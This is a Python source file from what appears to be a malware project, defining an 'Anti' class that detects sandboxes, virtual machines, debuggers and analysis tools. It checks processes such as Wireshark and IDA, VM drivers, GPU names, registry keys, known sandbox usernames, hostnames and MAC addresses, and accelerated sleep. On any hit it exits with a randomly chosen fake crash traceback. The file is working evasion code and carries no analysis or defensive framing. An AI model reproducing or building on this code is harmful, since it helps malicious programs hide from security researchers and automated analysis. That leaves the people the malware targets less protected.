import os, sys, socket, re, time, uuid, threading
from random import randint, choice

from src.utils import *

class Anti():
    def __init__(self):
        self.programfiles = os.getenv('PROGRAMFILES')
        self.hostname = socket.gethostname()
        self.username = os.getlogin()
        self.mac = ':'.join(re.findall('..','%012x'%uuid.getnode()))
        self.badprocs = ['dumpit','rammap','rammap64','vmmap','ida.exe','idaq.exe','ida64.exe','idaq64.exe','ollydbg.exe','pestudio.exe','x96dbg','x32dbg','httpdebuggerui','wireshark','fiddler','regedit','taskmgr','processhacker','hookexplorer','importrec','ksdumperclient','ksdumper','procexp','immunitydebugger','dumpcap','petools','lordpe','sysinspector','proc_analyzer','sysanalizer','sniff_hit','windbg','vboxservice','df5serv','vboxtray','vmtoolsd','vmwaretray','vmwareuser','vgauthservice','vmacthlp','vmsrvc','vmusrvc','xenservice','qemu-ga','joeboxcontrol','joeboxserver','prl_cc','plr_tools']
        self.gpus = ['Microsoft Remote Display Adapter','Microsoft Hyper-V Video','Microsoft Basic Display Adapter','VMware SVGA 3D','Standard VGA Graphics Adapter','UKBEHH_S','ASPEED Graphics Family(WDDM)','H_EDEUEK','VirtualBox Graphics Adapter','K9SC88UK','Стандартный VGA графический адаптер']
        self.paths = [f'{self.programfiles}\\VMWare', f'{self.programfiles}\\oracle\\virtualbox guest additions','C:\\WINDOWS\\vboxmrxnp.dll','C:\\WINDOWS\\System32\\vmGuestLib.dll','D:\\Tools','D:\\OS2','D:\\NT3X','C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys','C:\\WINDOWS\\system32\\drivers\\VBoxGuest.sys','C:\\WINDOWS\\system32\\drivers\\VBoxSF.sys','C:\\WINDOWS\\system32\\drivers\\VBoxVideo.sys','C:\\WINDOWS\\system32\\vboxdisp.dll','C:\\WINDOWS\\system32\\vboxhook.dll','C:\\WINDOWS\\system32\\vboxmrxnp.dll','C:\\WINDOWS\\system32\\vboxogl.dll','C:\\WINDOWS\\system32\\vboxoglarrayspu.dll','C:\\WINDOWS\\system32\\vboxoglcrutil.dll','C:\\WINDOWS\\system32\\vboxoglerrorspu.dll','C:\\WINDOWS\\system32\\vboxoglfeedbackspu.dll','C:\\WINDOWS\\system32\\vboxoglpackspu.dll','C:\\WINDOWS\\system32\\vboxoglpassthroughspu.dll','C:\\WINDOWS\\system32\\vboxservice.exe','C:\\WINDOWS\\system32\\vboxtray.exe','C:\\WINDOWS\\system32\\VBoxControl.exe','C:\\WINDOWS\\system32\\drivers\\vmmouse.sys','C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys','C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys','C:\\WINDOWS\\system32\\drivers\\vmkdb.sys','C:\\WINDOWS\\system32\\drivers\\vmrawdsk.sys','C:\\WINDOWS\\system32\\drivers\\vmmemctl.sys','C:\\WINDOWS\\system32\\drivers\\vm3dmp.sys','C:\\WINDOWS\\system32\\drivers\\vmci.sys','C:\\WINDOWS\\system32\\drivers\\vmsci.sys','C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys','\\.\\VBoxMiniRdrDN','\\.\\VBoxGuest','\\.\\pipe\\VBoxMiniRdDN','\\.\\VBoxTrayIPC','\\.\\pipe\\VBoxTrayIPC','\\.\\HGFS','\\.\\vmci']
        self.usernames = ['WDAGUtilityAccount','CurrentUser','SandBox','Emily','HAPUBWS','Hong Lee','IT-ADMIN','Johnson','Miller','milozs','Peter Wilson','richard','phil','timmy','sand box','malware','maltest','virus','John Doe']
        self.hostnames = ['SANDBOX','7SILVIA','HANSPETER-PC','JOHN-PC','MUELLER-PC','WIN7-TRAPS','FORTINET','TEQUILABOOMBOOM','SANBOX']
        self.macs = ['00:05:69','00:0c:29','00:1C:14','00:50:56','08:00:27','00:16:3E',"b4:2e:99:c3:08:3c","00:15:5d:00:07:34","00:e0:4c:b8:7a:58","00:0c:29:2c:c1:21","00:25:90:65:39:e4","c8:9f:1d:b6:58:e4","00:25:90:36:65:0c","00:15:5d:00:00:f3","2e:b8:24:4d:f7:de","00:15:5d:13:6d:0c","00:50:56:a0:dd:00","00:15:5d:13:66:ca","56:e8:92:2e:76:0d","ac:1f:6b:d0:48:fe","00:e0:4c:94:1f:20","00:15:5d:00:05:d5","00:e0:4c:4b:4a:40","42:01:0a:8a:00:22","00:1b:21:13:15:20","00:15:5d:00:06:43","00:15:5d:1e:01:c8","00:50:56:b3:38:68","60:02:92:3d:f1:69","00:e0:4c:7b:7b:86","00:e0:4c:46:cf:01","42:85:07:f4:83:d0","56:b0:6f:ca:0a:e7","12:1b:9e:3c:a6:2c","00:15:5d:00:1c:9a","00:15:5d:00:1a:b9","b6:ed:9d:27:f4:fa","00:15:5d:00:01:81","4e:79:c0:d9:af:c3","00:15:5d:b6:e0:cc","00:15:5d:00:02:26","00:50:56:b3:05:b4","1c:99:57:1c:ad:e4","08:00:27:3a:28:73","00:15:5d:00:00:c3","00:50:56:a0:45:03","12:8a:5c:2a:65:d1","00:25:90:36:f0:3b","00:1b:21:13:21:26","42:01:0a:8a:00:22","00:1b:21:13:32:51","a6:24:aa:ae:e6:12","08:00:27:45:13:10","00:0c:29", "00:50:56", "08:00:27", "52:54:00 ", "00:21:F6", "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D","00:21:28","00:01:5D","00:21:F6","00:A0:A4","00:07:82","00:03:BA","08:00:20","2C:C2:60","00:10:4F","00:0F:4B","00:13:97","00:20:F2","00:14:4F"]
    
    def throw_error(self):
        errors = [
            f'Library API: Exception caught in function \'api_function\'\nBacktrace:\n~/Git/fish/src/detail/Library.cpp:{str(randint(100,200))} : library_function failed\n~/Git/fish/src/detail/Library.cpp:{str(randint(1,99))} : could not open file "fish.txt"',
            f'backtrace() returned 8 addresses\n   ./fish(wow3+0x5c) [0x80487f0]\n   ./fish [0x8048871]\n   ./fish(wow+0x21) [0x8048894]\n   ./fish(wow+0x1a) [0x804888d]\n   ./fish(wow+0x1a) [0x804888d]\n   ./fish(main+0x65) [0x80488fb]\n   /lib/libc.so.{str(randint(1,40))}(__libc_start_main+0xdc) [0xb7e38f9c]\n   ./fish [0x8048711]',
            f"Traceback (most recent call last):\n  File \"<{__file__}>\", line {str(randint(0,200))}, in <module>\n"+ choice([f"NameError: name '{''.join([choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOP') for _ in range(10)])}' is not defined", "ZeroDivisionError: division by zero", "TypeError: can only concatenate str (not \"int\") to str"])
        ]

        sys.exit(choice(errors))

    def bad_procs(self):
        [self.throw_error() if Utils().proc_exists(badproc) else 0 for badproc in self.badprocs]
    
    def bad_gpu(self):
        if os.name == 'nt': myGPU = str(os.popen("wmic path win32_VideoController get name").read().lower()).strip("Name\n").rstrip()
        else: myGPU = str(os.popen('lspci -k | grep -EA3 "VGA|3D|Display"').read().lower()).rstrip()
    
        [self.throw_error() if gpu in myGPU else None for gpu in self.gpus]
    
    def bad_regkeys(self):
        if os.name == 'nt':
            try:
                if (os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul') != 1 \
                and os.system('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul') != 1) \
                or os.system('REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters 2> nul') != 1:
                    self.throw_error()
            except Exception: pass
    
    def speedy_sleep(self):
        tick = time.time()
        time.sleep(60)
        tock = time.time()
    
        if not int(tock - tick) > 59: self.throw_error() # accelerated sleep
    
    bad_users = lambda self: [self.throw_error() if username.lower() == self.username else None for username in self.usernames] # exact match,else skip
    bad_hosts = lambda self: [self.throw_error() if pc_hostname == self.hostname else None for pc_hostname in self.hostnames]
    bad_dirs = lambda self: [self.throw_error() if os.path.exists(path) else None for path in self.paths]
    bad_mac = lambda self: [self.throw_error() if mac == self.mac else None for mac in self.macs]
    has_trace = lambda self: self.throw_error() if getattr(sys, 'gettrace', lambda : None) else None
    has_flags = lambda self: self.throw_error() if sys.flags.dont_write_bytecode or sys.flags.debug else None
    
    def is_venv(self):
        try:
            if getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None):
                self.throw_error()
        except Exception: return
    
    def is_pycharm(self):
        try:
            if os.getenv('PYCHARM_HOSTED') != None:
                self.throw_error()
        except Exception: return
    
    def is_replit(self):
        try:
            if [k for k in os.environ.keys() if 'REPLIT_' in k] != [] and 'runner' in os.path.expanduser('~').lower():
                self.throw_error()
        except Exception: return
    
    def bad_fname(self): # matches md5 or sha256 names
        if bool(re.match(r'[a-fA-F\d]{32}', sys.argv[0])) or bool(re.match(r'[A-Fa-f0-9]{64}', sys.argv[0])):
            self.throw_error()
    
    def start_check(self):
        try:
            threadbox = []
            for func in [self.bad_fname,self.is_pycharm,self.is_replit,self.speedy_sleep,self.is_venv,self.has_flags,self.has_trace,self.bad_mac,self.bad_dirs,self.bad_hosts,self.bad_users,self.bad_regkeys,self.bad_gpu,self.bad_procs]:
                try:
                    kaboom = threading.Thread(target=func)
                    threadbox.append(kaboom)
                    kaboom.start()
                except Exception: pass
    
            for thread in threadbox:
                thread.join()
        except Exception: 
            pass